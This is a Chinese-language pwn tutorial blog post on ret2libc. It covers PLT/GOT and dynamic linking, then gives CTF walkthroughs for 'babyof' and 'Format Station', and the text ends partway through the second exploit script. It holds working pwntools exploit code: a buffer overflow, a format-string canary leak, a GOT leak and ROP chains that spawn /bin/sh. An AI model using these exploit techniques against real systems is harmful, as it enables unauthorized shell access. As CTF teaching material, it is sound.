---
title: Pwn-ret2libc
description: pwn-第7部分知识ret2libc
date: 2026-05-17 01:06:11
updated: 2026-06-05 18:00:00
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260123142048_9f05b8ba428e596429adcd9d49e4c980626510519.jpg
categories: [pwn, 安全]
tags: [pwn]
recommend: 10
---

## PWN-Ret2libc

### 基本概念

> libc 是 Linux 系统中遵循 ANSI C 标准的 C 语言函数库，提供文件操作、内存管理、字符串处理等基础功能，并封装系统调用以便应用程序使用。

---

### Ret2libc 与 ROP 链的终点

现代二进制程序普遍开启了 NX（不可执行）保护，导致传统的"栈溢出直接执行 Shellcode"失效。此时，Glibc 中丰富的代码片段成为了现成的利用跳板。

- 攻击者通常的第一步是泄露运行时的 **libc 基址**（因为 ASLR 的存在，每次加载地址不同）。
- 通过计算偏移，在 Glibc 中精准定位 `system` 函数以及 `/bin/sh` 字符串的真实地址。
- 利用栈溢出劫持 RIP/EIP，将执行流导向 Glibc，从而巧妙绕过 NX 保护拿下 Shell（即经典的 Ret2libc 攻击）。

---

### 动态链接的完整流程

以 `./format_station` 为例：

```
你敲 ./format_station
  ↓
内核加载程序到内存
  ↓
看到程序头部写着："我要 ld-2.36.so 来帮我链接"
  ↓
内核先加载 ld-2.36.so（动态链接器）
  ↓
把控制权交给 ld-2.36.so
  ↓
ld-2.36.so 做这些事：
  1. 加载 libc.so.6 到内存
  2. 找到 puts、printf、system 在 libc 里的地址
  3. 把这些地址填到程序的 GOT 表里
  4. 跳到程序的 main 开始执行
  ↓
程序运行时：
  调用 puts@plt → 查 GOT 表 → 跳到 libc 里的 puts
```

#### 动态链接器是什么

动态链接器 = `ld-2.36.so`（一个特殊的可执行文件）

它的作用：
- 在程序启动时，把 `libc.so.6` 加载进来
- 把函数的真实地址填到 GOT 表
- 让程序能正常调用 libc 函数

#### 为什么要 patchelf

原程序写的：

```
我要 /lib64/ld-linux-x86-64.so.2
↑ 系统默认的动态链接器
```

但本题给的 libc 是 2.36 版本，系统默认的链接器可能是其他版本 → 版本不匹配 → 地址算错 → exploit 崩溃。

所以用 patchelf 修改：

```bash
patchelf --set-interpreter ./ld-2.36.so format_station
```

改成：

```
我要当前目录下的 ld-2.36.so
↑ 保证链接器和 libc 版本一致
```

#### 总结

程序启动需要两样东西：
1. `format_station`（程序本身）
2. `ld-2.36.so`（动态链接器，负责加载 libc 并填 GOT 表）

`patchelf` 的作用：告诉程序"用这个 ld-2.36.so 来链接，别用系统的"，避免链接器版本和 libc 版本不匹配。

没有动态链接器，程序启动时就不知道去哪找 libc，GOT 表也不会被填充，调用 libc 函数就会崩溃。

---

### 静态链接 vs 动态链接

因为程序编译时，`puts`、`printf`、`system` 这些函数不在你的程序里，它们在 `libc.so.6` 这个库里。

| 特性 | 静态链接 | 动态链接 |
| ---- | ------- | ------- |
| 方式 | 把 libc 的代码整个复制到你的程序里 | 程序里只留一个"占位符"，运行时再去 libc.so.6 里找真正的代码 |
| 体积 | 程序体积大 | 程序体积小 |
| 依赖 | 可以独立运行 | 多个程序可以共享同一个 libc |

#### 本题为什么必须用动态链接

看一下程序里的调用：

```c
printf(buf, canary, puts@plt);
//      ↓
//      puts@plt 这个地址在程序自己的代码段里
//      但真正的 puts 代码在 libc.so.6 里
```

动态链接的机制：

程序里的 `puts@plt`（如 `0x401080`）：
- 这不是真正的 `puts` 函数
- 这是一个"跳板"，里面只有一条 `jmp` 指令
- 跳到 GOT 表里记录的真实地址

GOT 表（`puts@GOT`）：
- 程序第一次调用 `puts@plt` 时
- 动态链接器（`ld-2.36.so`）把 `puts` 在 libc 里的真实地址填到这里
- 以后每次调用就直接跳过去

```
程序调用 puts
  ↓
进入 puts@plt（跳板，固定地址 0x401080）
  ↓
查 GOT 表（存着 puts 的真实 libc 地址）
  ↓
跳转到 libc.so.6 里的 puts 真实代码
  ↓
执行 puts，返回
```

#### 本题的利用原理

正是因为动态链接，GOT 表里存着 libc 的真实地址，我们才能泄露：

```
阶段2: ROP 调用 puts(puts@GOT)
  ↓
  GOT 表里存着: 0x7f1234567980（puts 在 libc 中的真实地址）
  ↓
  把这个值泄露出来
  ↓
阶段3: libc_base = 0x7f1234567980 - libc中puts的偏移
       system = libc_base + system的偏移
       /bin/sh = libc_base + /bin/sh的偏移
```

如果程序是静态链接的，就没有 GOT 表，就没有办法通过泄露 GOT 来获取 libc 基址，ret2libc 攻击就做不了。

---

### PLT 表和 GOT 表

在进行 ret2libc 学习之前，我们需要先了解一下 PLT 表与 GOT 表的内容。

**GOT（Global Offset Table，全局偏移量表）**，位于数据段，是一个每个条目是 8 字节地址的数组，用来存储外部函数在内存的确切地址。

```
puts@got 在 0x601018:   ← 这里存着 puts 在 libc 里的地址
                        ← 第一次调用前：指向解析器
                        ← 第一次调用后：0x7fXXXXXXXXXX
```

**PLT（Procedure Linkage Table，过程连接表）**，位于代码段，是一个每个条目是 16 字节内容的数组，使得代码能够方便的访问共享的函数或者变量，地址固定。

```
puts@plt 在 0x400520:  jmp  *[puts@got]    ; 跳转到 GOT 记录的位置
```

| | PLT | GOT |
| --- | --- | --- |
| 位置 | 代码段（.plt） | 数据段（.got.plt） |
| 内容 | 跳转指令 | 函数真实地址 |
| 类比 | 电灯开关 | 开关连到哪个灯泡 |
| 你能否控制？ | 不能直接写 | 可以读（泄露） |

关于 GOT 与 PLT 的详细内容可以看[这个视频](https://www.bilibili.com/video/BV1a7411p7zK?spm_id_from=333.999.0.0)学习，这里只进行简要介绍。

简单来说，当程序第一次执行函数 A 时，流程如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/75d720d29003b16fa2b3872f760c6fa4.png){unoptimized=true}

在汇编程序调用函数 A 时，会先找到函数 A 对应的 PLT 表，PLT 表中第一行指令则是找到函数 A 对应的 GOT 表。此时由于是程序第一次调用 A，GOT 表还未更新，会先去公共 PLT 进行一番操作查找函数 A 的位置，找到 A 的位置后再更新 A 的 GOT 表，并调用函数 A。

![img](https://i-blog.csdnimg.cn/blog_migrate/694af6bfcf4b5036c116b65a84ccce7c.png){unoptimized=true}

当程序第二次执行函数 A 时，流程如下：

![请添加图片描述](https://i-blog.csdnimg.cn/blog_migrate/694af6bfcf4b5036c116b65a84ccce7c.png){unoptimized=true}

可以看到此时 A 的 GOT 表已经更新，可以直接在 GOT 表中找到其在内存中的位置并直接调用。

动态链接的程序（调用了 libc 的函数）需要知道函数在内存中的实际地址。但由于 ASLR，这个地址每次运行不同。

---

### 解题思路

我们的目标是拿到 shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行 `system("/bin/sh")`。拆分这个目标，可以分为以下两个步骤：

> 1. 找到 `system()` 函数和 `/bin/sh` 字符串在 libc 中的地址。
> 2. 劫持程序的执行流程，让程序执行 `system("/bin/sh")`。

实现第二步不难，只要精巧合理地构造溢出，把 main 函数的返回地址覆盖为 `system()` 函数的地址，并合理实现传参即可。关键在于如何找到 `system()` 函数和 `"/bin/sh"` 字符串的地址。这两个关键地址都在 libc 库中，这就是这类题型被叫做 ret2libc 的原因。那么如何寻找 libc 中的 `system()` 函数和 `"/bin/sh"` 字符串呢？这里需要用到以下公式：

> 函数的真实地址 = 基地址 + 偏移地址

要牢牢记住我们的目标：找到 `system()` 函数和 `"/bin/sh"` 字符串的真实地址。下面我们对这个公式做一个解释：

> **偏移地址**：libc 是 Linux 新系统下的 C 函数库，其中就会有 `system()` 函数、`"/bin/sh"` 字符串，而 libc 库中存放的就是这些函数的偏移地址。换句话说，只要确定了 libc 库的版本，就可以确定其中 `system()` 函数、`"/bin/sh"` 字符串的偏移地址。解题核心在于如何确定 libc 版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的 libc 版本即可。
>
> **基地址**：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位却始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出 libc 的版本（此处需要用到工具 LibcSearcher 库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址：
>
> 这次运行程序的基地址 = 这次运行得到的某个函数 func 的真实地址 - 函数 func 的偏移地址
>
> 即可求出这次运行的基地址。

这回问题又发生了转化：如何找到某个函数 func 的真实地址呢？

> 像 `puts()`、`write()` 这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即 GOT 表中存放的地址）。某个函数又指哪个函数呢？由于 Linux 的延迟绑定机制，我们必须选择一个 main 函数中已经执行过的函数（这样才能保证该函数在 GOT 表的地址可以被找到），选哪个都可以，当然也可以直接选 puts 和 write，毕竟题目中像 puts 和 write 往往会直接出现在 main 函数中。

总结一下上面这段话，我们可以通过构造 payload 让程序执行 `puts(puts@got)` 或者 `write(1, write@got, 读取的字节数)` 打印 puts 函数 / write 函数的真实地址。

#### 整体思路总结（关键）

1. 首先寻找一个函数的真实地址，以 puts 为例。构造合理的 payload1，劫持程序的执行流程，使得程序执行 `puts(puts@got)` 打印得到 puts 函数的真实地址，并重新回到 main 函数开始的位置。
2. 找到 puts 函数的真实地址后，根据其最后三位，可以判断出 libc 库的版本（本文忽略）。
3. 根据 libc 库的版本可以很容易的确定 puts 函数的偏移地址。
4. 计算基地址。基地址 = puts 函数的真实地址 - puts 函数的偏移地址。
5. 根据 libc 函数的版本，很容易确定 system 函数和 `"/bin/sh"` 字符串在 libc 库中的偏移地址。
6. 根据"真实地址 = 基地址 + 偏移地址"计算出 system 函数和 `"/bin/sh"` 字符串的真实地址。
7. 再次构造合理的 payload2，劫持程序的执行流程，劫持到 `system("/bin/sh")` 的真实地址，从而拿到 shell。

---

### 知识点动画

[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html)

---

## [2021 鹤城杯]babyof

题目链接：https://www.nssctf.cn/problem/469

```bash
checksec --file=babyof
```

| 保护 | 含义 | 本程序 | 对攻击的影响 |
| --- | --- | --- | --- |
| **Canary** | 栈上放一个随机值，函数返回前检查是否被改 | ❌ 没有 | 可以随意覆盖返回地址 |
| **NX** | 栈不可执行 | ✅ 开启 | 不能写 shellcode，必须 ROP |
| **PIE** | 代码地址随机化 | ❌ 没有 | 代码段地址固定，gadget 地址可直接写死 |
| **RELRO** | GOT 表保护 | ⚠️ Partial | GOT 可读，能泄露 libc 地址 |

---

### pwntools 基础速查

| 代码 | 作用 |
| --- | --- |
| `ELF('./babyof')` | 加载 ELF 文件，分析符号、PLT、GOT |
| `elf.plt['puts']` | 获取 puts@plt 地址 |
| `elf.got['puts']` | 获取 puts@got 地址 |
| `p64(0x400743)` | 把 64 位整数转成 8 字节小端 |
| `u64(data)` | 把 8 字节小端转成 64 位整数 |
| `process('./babyof')` | 启动本地进程 |
| `remote('ip', port)` | 连接远程 |
| `r.recvline()` | 收一行 |
| `r.sendline(data)` | 发一行（+换行） |
| `r.interactive()` | 进入交互模式，可以敲命令 |
| `ROPgadget --binary X` | 搜索 gadget（命令行工具） |

### 0x01 检查保护

```bash
checksec --file=babyof
```

![image-20260514094601448](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152552779-927052389.png)

main：
![image-20260514094747455](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152552364-435279646.png)

sub_400632：
![image-20260514094804460](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551912-1656661937.png)

函数结构简单，sub_400632 函数出现了 read 读出栈溢出漏洞。

**漏洞：** 栈空间只有 64 字节，但 `read` 读了 256 字节 → **缓冲区溢出**。

string 下未发现 `system`、`/bin/sh` 参数：

![image-20260514094928243](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551505-2117563153.png)

NX 开启，栈上内容无法当代码运行，那么就考虑 libc 方向。

Libc 的解题就是先找一个函数基地址，计算 libc 基址，再进行 system 偏移（Libc 存在 system 函数方法）。

---

### 0x02 offset 计算

函数栈布局：

```
        +----------------+
rbp+0x8 |  返回地址       |  ← 我们要覆盖这里
rbp     |  saved rbp      |  ← 8 字节
rbp-0x40|  buffer[64]     |  ← 从这里开始写
        +----------------+
```

从 buffer 到返回地址的距离 = `0x40` + `8`（saved rbp）= `72` 字节。

更快的方法就是使用 cyclic 生成随机字符串，对程序进行破坏，用 gdb 进行检查程序 ret 错误地址的指向：

![image-20260514100405313](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551161-2011555038.png)

![image-20260514100535855](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152550495-638900665.png)

复制 rsp 前 8 字节：`saaataaa`，再利用 cyclic 查表：

```bash
cyclic -l saaataaa
```

![image-20260514104554746](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152948422-1653021008.png)

offset = 72

---

### 0x03 攻击思路

程序只有 3 个 PLT 函数：`puts`、`read`、`setvbuf`。

没有 `system`，没有 `/bin/sh`，所以分两步：

#### 第 1 步：泄露 libc 地址

```
puts(puts@got)  → 打印出 puts 在 libc 中的真实地址
                → 算出 libc 基址
                → 算出 system 和 /bin/sh
```

#### 第 2 步：ROP 调用 system

```
system("/bin/sh")  → 拿 shell
```

---

### 0x04 需要的地址

#### 程序内地址（无 PIE，地址固定）

| 什么 | 地址 | 怎么找 |
| --- | --- | --- |
| `puts@plt` | `0x400520` | `elf.plt['puts']` |
| `puts@got` | `0x601018` | `elf.got['puts']` |
| 漏洞函数 | `0x400632` | objdump 看入口 |
| `pop rdi; ret` | `0x400743` | `ROPgadget --binary babyof \| grep "pop rdi"` |
| `ret` | `0x40066a` | `ROPgadget --binary babyof \| grep ": ret$"` |

#### libc 内地址（需要泄露后计算）

| 什么 | 怎么算 |
| --- | --- |
| libc 基址 | `leak - libc.symbols['puts']` |
| `system` | `libc.symbols['system']` |
| `/bin/sh` | `next(libc.search(b'/bin/sh\x00'))` |

`pop_rdi_addr = 0x0400743`

![image-20260514110810551](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152948032-1301476799.png)

---

### 0x05 ROP 链图解

#### 第 1 轮：泄露

```python
payload = "a"*72 + pop_rdi + puts_got + puts_plt + vuln_addr

          72字节填充   ↑ 参数     ↑ 打印     ↑ 返回来再溢出一次
                       puts_got   puts_plt   vuln_addr
                       放进 rdi   执行 puts
```

执行流程：

```
发送 payload
  ↓
程序 puts("I hope you win")
  ↓
ret → pop rdi; ret
  → rdi = puts_got (0x601018)
  → ret 到 puts_plt
  → puts(0x601018) 打印出 GOT 表里的 puts 地址
  → ret 到 vuln_addr (0x400632)
  → 又打印 "Do you know..."，等你第二次输入
```

由于是 libc 题目，我们先在本地跑成功脚本之后再去远程测试服务器版本。

先查查本机 libc 版本：

```bash
ldd babyof
```

![image-20260514132340537](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152947659-2072343628.png)

#### payload 1 泄漏构造

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

r = process('./babyof')
elf = ELF('./babyof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# part1
r.recvline()
offset = 72
pop_rdi = 0x0400743
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vuln_addr = 0x0400632
payload_1 = b'a'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)

r.sendline(payload_1)

r.recvline()
leak = r.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
print("puts addr ->", hex(leak))

r.interactive()
```

![image-20260514132719414](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152947071-1574725207.png)

可以看到 puts 的真实地址被映射出来了，那么可以还原 libc 基址了。

#### payload 2 泄露构造

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

r = process('./babyof')
elf = ELF('./babyof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# part1
r.recvline()
offset = 72
pop_rdi = 0x0400743
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vuln_addr = 0x0400632
payload_1 = b'a'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)

r.sendline(payload_1)

r.recvline()
leak = r.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
print("puts addr ->", hex(leak))

# part2
libc.address = leak - libc.symbols['puts']

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
ret = 0x040066A
print("libc base addr -> ", hex(libc.address))
print("system addr -> ", hex(system))
print("bin_sh ->", hex(bin_sh))

payload_2 = b'a'*offset
payload_2 += p64(ret)
payload_2 += p64(pop_rdi)
payload_2 += p64(bin_sh)
payload_2 += p64(system)

r.sendline(payload_2)
r.interactive()
```

**函数解释**

```python
libc.address = leak - libc.symbols['puts']
```

计算 libc 基址。

- `leak` = 我们泄露出来的 puts 在内存中的真实地址（如 `0x7f12345678xx`）
- `libc.symbols['puts']` = puts 在 libc 文件中的固定偏移（比如 `0x809c0`）
- 真实地址 - 偏移 = 基址

```
例: 0x7f12345678xx - 0x809c0 = 0x7f1234560000  ← libc 基址
```

`libc.address = XXX` 是 pwntools 的赋值语法，设置后后续所有 `libc.symbols['xxx']` 都会自动加上这个基址。

```python
system = libc.symbols['system']
```

获取 system 函数的内存地址。因为上一步已经设置了 `libc.address`，这里等价于：

```
system = libc_base_addr + 0x4f440   # system 在 libc 中的偏移
```

```python
bin_sh = next(libc.search(b'/bin/sh\x00'))
```

`libc.search(b'/bin/sh\x00')` 返回一个生成器，遍历 libc 所有包含 `/bin/sh` 的位置。`next()` 取第一个匹配的地址。

为什么 libc 里有 `/bin/sh`？——因为 system 函数内部会用到 `/bin/sh`，这个字符串天然就存在于 libc 的数据段中，攻击者直接借用就行。

---

### 0x06 常见问题 FAQ

#### Q1：PLT 和 GOT 有什么区别？

| | PLT | GOT |
| --- | --- | --- |
| 本质 | 跳板/入口 | 记录真实地址 |
| 比喻 | 门牌号（固定） | 里面住着谁（运行时才确定） |

#### Q2：为什么要返回到 vuln_addr 再打一轮？

一次溢出只能做一个 ROP 链。需要：

- 第一次：泄露地址
- 第二次：拿 shell

所以第一次结束要回到漏洞函数，获取第二次输入机会。

#### Q3：远程怎么确定 libc 版本？

1. 先用 exp 打远程，泄露 puts 的地址
2. 看地址最后 3 位（如 `0xaa0`）
3. 去 https://libc.rip 搜 `puts` / `0xaa0`
4. 下载匹配的 libc 文件

如果多个结果匹配，可以同时泄露 puts 和 read 两个地址，用组合偏移唯一确定。

#### Q4：ret 对齐是做什么的？

x86-64 的 system 函数内部有 `movaps` 指令，要求栈 16 字节对齐。不加 `ret` 多弹 8 字节 → 栈不对齐 → 段错误。

---

## [Zero-G 2026] Format Station

### 0x01 题目分析

#### 文件信息

```asm
format_station: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

保护全开，但没有PIE，所以代码段地址固定。

---



#### 反汇编分析

##### **main函数**

```asm
main:
  call init_io        ; 关闭缓冲
  call vuln           ; 漏洞函数
```

##### **vuln函数（关键）**

![img](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154553302-1277060360.png)

```asm
vuln:
  sub rsp, 0xe0
  mov [rbp-0x8], canary     ; 存储canary
  call read_canary           ; 从TLS读取canary到rax
  mov [rbp-0xe0], rax       ; 保存canary值

  ; 打印提示
  puts "ZeroG Format Station"
  puts "Send your format beacon:"

  ; 第一次read：格式化字符串漏洞
  lea rsi, [rbp-0x90]       ; 缓冲区1（format beacon）
  mov rdx, 0x7f             ; 最多读127字节
  call read

  ; printf漏洞！
  mov rdi, [rbp-0x90]       ; 格式字符串
  mov rsi, [rbp-0xe0]       ; 参数1 = canary
  mov rdx, 0x401080         ; 参数2 = puts@plt地址
  call printf               ; 格式化字符串漏洞！

  puts "Send your access packet:"

  ; 第二次read：栈溢出
  lea rsi, [rbp-0xd0]       ; 缓冲区2（access packet）
  mov rdx, 0x100            ; 最多读256字节
  call read

  ; canary检查 + 返回
  leave
  ret
```

---



#### 栈布局

```asm
[rbp-0xe0]  canary值（read_canary返回值）
[rbp-0xd0]  缓冲区2（access packet）← 第二次read
[rbp-0x90]  缓冲区1（format beacon）← 第一次read（printf格式字符串）
[rbp-0x8]   canary备份
[rbp]       saved rbp
[rbp+0x8]   返回地址
```

**偏移量计算：**

- 缓冲区2 → canary：0xd0 - 0x8 = 0xc8
- 缓冲区2 → 返回地址：0xd0 + 0x8 = 0xd8

---

### 0x02 漏洞点

1. **格式化字符串漏洞**：`printf(buffer, canary, puts@plt)` — 用户输入的buffer作为格式字符串
2. **栈溢出**：第二次read读取0x100字节到0xd0大小的缓冲区，可以覆盖返回地址

---



### 0x03 利用思路

#### 阶段1：泄露canary

利用格式化字符串`%1$016lx`泄露canary（printf的第一个参数）。

```
输入: %1$016lx.%2$p
输出: d48ad7a33fbf2400.0x401080
         ↑canary        ↑puts@plt（固定地址，无用）
```

---



##### 扩展printf参数打印调用

::alert{type="question"}
为什么必须使用%格式化字符串才能打印出canary和puts的数据
::

因为 printf 是用可变参数（variadic arguments）实现的

在 x86-64 上，函数调用时参数放在寄存器里：

```c  
printf(fmt, canary, puts@plt)
          ↓      ↓        ↓
         rdi    rsi      rdx
```

printf 内部的逻辑大致是这样的：

```c
 void printf(const char *fmt, ...) {
      va_list args;
      va_start(args, fmt);    // args 指向 rsi（canary）的位置

      while (*fmt) {
          if (*fmt == '%' && *(fmt+1) == 'd') {
              int val = va_arg(args, int);  // 从 args 位置取一个值，然后 args 往后移
              print_int(val);
          } else if (*fmt == '%' && *(fmt+1) == 's') {
              char *s = va_arg(args, char*);
              print_string(s);
          } else {
              putchar(*fmt);  // 普通字符直接输出，不读参数
          }
          fmt++;
      }
  }
```

- va_start(args, fmt) 让 args 指向 rsi 寄存器的位置（canary）
  - 每遇到一个 % 格式符，va_arg 就从 args 读取下一个值，然后指针后移
  - 普通字符直接输出，不读参数
- 所以：
  - 输入 "hello" → 遍历完所有字符，一次都没调用 va_arg，canary 和 puts 根本没被读取
  - 输入 "%1$lx" → 调用 va_arg，从 rsi（canary）的位置读出值并打印

---

printf 的缺陷：

       1. 它不检查格式化字符串要求的参数数量是否和实际传入的一致
       2. 它不检查格式化字符串是否来自可信来源
       3. 它只是机械地按 % 符号从寄存器/栈上取值



---



#### 阶段2：泄露libc地址

用canary + ROP调用`puts(puts@GOT)`，泄露puts在libc中的真实地址。

```
ROP链: padding(0xc8) + canary + padding(8) + pop_rdi_ret + puts@GOT + puts@plt + main
```

为什么返回main而不是vuln？因为返回vuln时rbp是垃圾值，vuln内部的`mov [rbp-0xe0], rax`会写入无效地址导致SIGSEGV。

---



#### 阶段3：计算libc基址 + ret2system

```
libc_base = puts真实地址 - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + 下一个"/bin/sh"的偏移
```

ROP链需要一个`ret`做栈对齐（16字节对齐要求）：

```
ROP链: padding(0xc8) + canary + padding(8) + ret + pop_rdi_ret + bin_sh + system
```

---

#### 阶段4：链接动态数据

::alert{type="question"}
为什么要动态链接？
::



因为程序编译时，puts、printf、system 这些函数不在你的程序里，它们在 libc.so.6
  这个库里。

  静态链接 vs 动态链接

  静态链接: 把 libc 的代码整个复制到你的程序里
            程序体积大，但可以独立运行

  动态链接: 程序里只留一个"占位符"，运行时再去 libc.so.6 里找真正的代码
            程序体积小，多个程序可以共享同一个 libc

  本题为什么必须用动态链接

  看一下程序里的调用：

```python
  printf(buf, canary, puts@plt);
  //      ↓
  //      puts@plt 这个地址在程序自己的代码段里
  //      但真正的 puts 代码在 libc.so.6 里
```



  动态链接的机制：

  程序里的 puts@plt（0x401080）:
      这不是真正的 puts 函数
      这是一个"跳板"，里面只有一条 jmp 指令
      跳到 GOT 表里记录的真实地址

  GOT 表（puts@GOT）:
      程序第一次调用 puts@plt 时
      动态链接器（ld-2.36.so）把 puts 在 libc 里的真实地址填到这里
      以后每次调用就直接跳过去

```
  程序调用 puts
      ↓
  进入 puts@plt（跳板，固定地址 0x401080）
      ↓
  查 GOT 表（存着 puts 的真实 libc 地址）
      ↓
  跳转到 libc.so.6 里的 puts 真实代码
      ↓
  执行 puts，返回

  本题的利用原理

  正是因为动态链接，GOT 表里存着 libc 的真实地址，我们才能泄露
```

```
阶段2: ROP 调用 puts(puts@GOT)
         ↓
         GOT 表里存着: 0x7f1234567980（puts 在 libc 中的真实地址）
         ↓
         把这个值泄露出来
         ↓
  阶段3: libc_base = 0x7f1234567980 - libc中puts的偏移
         system = libc_base + system的偏移
         /bin/sh = libc_base + /bin/sh的偏移
```

  如果程序是静态链接的，就没有 GOT 表，就没有办法通过泄露 GOT 来获取 libc
  基址，ret2libc 攻击就做不了。

---

##### 动态链接的完整流程

```
 你敲 ./format_station
      ↓
  内核加载程序到内存
      ↓
  看到程序头部写着: "我要 ld-2.36.so 来帮我链接"
      ↓
  内核先加载 ld-2.36.so（动态链接器）
      ↓
  把控制权交给 ld-2.36.so
      ↓
  ld-2.36.so 做这些事:
      1. 加载 libc.so.6 到内存
      2. 找到 puts、printf、system 在 libc 里的地址
      3. 把这些地址填到程序的 GOT 表里
      4. 跳到程序的 main 开始执行
      ↓
  程序运行时:
      调用 puts@plt → 查 GOT 表 → 跳到 libc 里的 puts
```

  动态链接器是什么？



  动态链接器 = ld-2.36.so（一个特殊的可执行文件）

  它的作用:
      在程序启动时，把 libc.so.6 加载进来
      把函数的真实地址填到 GOT 表
      让程序能正常调用 libc 函数

---

  为什么要 patchelf?

  ```
原程序写的: "我要 /lib64/ld-linux-x86-64.so.2"
                  ↑ 系统默认的动态链接器
  ```



  但本题给的 libc 是 2.36 版本
  系统默认的链接器可能是其他版本
  版本不匹配 → 地址算错 → exploit 崩溃

  所以:

```bash
patchelf --set-interpreter ./ld-2.36.so format_station
      ↓
      改成: "我要当前目录下的 ld-2.36.so"
      ↓
      保证链接器和 libc 版本一致
```

​     

  总结

  程序启动需要两样东西:
      1. format_station（程序本身）
      2. ld-2.36.so（动态链接器，负责加载 libc 并填 GOT 表）

  patchelf 的作用:
      告诉程序 "用这个 ld-2.36.so 来链接，别用系统的"
      避免链接器版本和 libc 版本不匹配

  没有动态链接器，程序启动时就不知道去哪找 libc，GOT 表也不会被填充，调用 libc
  函数就会崩溃。

---

##### 几种方法确认连接器版本

方法1：readelf

```bash
readelf -l format_station | grep interpreter
```



输出：

```lua
[Requesting program interpreter: ./ld-2.36.so]
```

方法2：file

file format_station

输出里会有一段：
interpreter ./ld-2.36.so

方法3：直接看程序头部

readelf -l format_station

输出：

```lua
Program Headers:
 Type           Offset             VirtAddr           PhysAddr
                FileSiz            MemSiz              Flags  Align
 INTERP         0x0000000000000318 0x0000000000400318 0x0000000000400318
                0x000000000000001c 0x000000000000001c  R      0x1
     [Requesting program interpreter: ./ld-2.36.so]
                   ↑ 这就是它要的动态链接器
```

本题的情况

原程序要求的链接器: ./ld-2.36.so（已经用 patchelf 设置好了）

如果没 patchelf，一般会是:
   /lib64/ld-linux-x86-64.so.2     （64位系统默认）
   /lib/ld-linux.so.2              （32位系统默认）

什么时候需要 patchelf

readelf -l 看到的链接器    实际目录下的链接器     需要patchelf吗  ─────────────────────────────────────────────────────────────
/lib64/ld-linux-x86-64.so.2   系统有这个             不需要
./ld-2.36.so                  当前目录有这个          不需要（已设置好）
/lib64/ld-linux-x86-64.so.2   只有 ./ld-2.36.so      需要！



  一句话：拿到题先 readelf -l
  看链接器是什么，再看题目给的文件里有没有这个链接器，没有就用 patchelf 改。

```bash
readelf -l format_station | grep interpreter
```

![image-20260524153235110](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552908-948675362.png)

好问题，现在我怎么确定是什么系统版本的呢？

看一下题目给的libc

```bash
strings libc.so.6 | grep "stable release"
```

![image-20260524153550214](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552554-1932717418.png)

知道是 Debian 12 + glibc 2.36 后：

用 glibc-all-in-one 工具

```bash
git clone https://github.com/nickglibc/glibc-all-in-one.git
cd glibc-all-in-one
./build 2.36
```

>实际流程
>
>第一步：自己确认 libc 版本
>
>
>
>strings libc.so.6 | grep "GLIBC"
>
>
>
>输出: GLIBC 2.36
>
>
>
>第二步：告诉 glibc-all-in-one 要 2.36
>
>
>
>./download 2.36       # 下载预编译好的 或  ./build 2.36          # 自己编译
>
>
>
>第三步：它会下载对应的 ld.so 和 libc.so.6 到某个目录
>
>你再拷出来用
>
>



也可以用libc.rip

::alert{icon="ph:files-duotone" color="var(--c-accent)" title="libc查询"}

https://libc.rip/

::






### 0x04 完整Exploit

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./format_station')
libc = ELF('./libc.so.6')

r = process('./format_station')

ret = 0x4013bc
offset = 0xc8
pop_rdi_ret = 0x4011fc

# 阶段1：泄露canary
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$016lx.%2$p")
line = r.recvline().strip()
canary = int(line.split(b'.', 1)[0], 16)
print("[+]canary->", hex(canary))

# 阶段2：泄露puts真实地址
r.recvuntil(b"Send your access packet:\n")
payload_2 = b'a' * offset
payload_2 += p64(canary)
payload_2 += b'b' * 8
payload_2 += p64(pop_rdi_ret)
payload_2 += p64(elf.got['puts'])
payload_2 += p64(elf.plt['puts'])
payload_2 += p64(0x4013bd)  # 返回main
r.sendline(payload_2)

r.recvuntil(b"[-] packet rejected\n")
puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
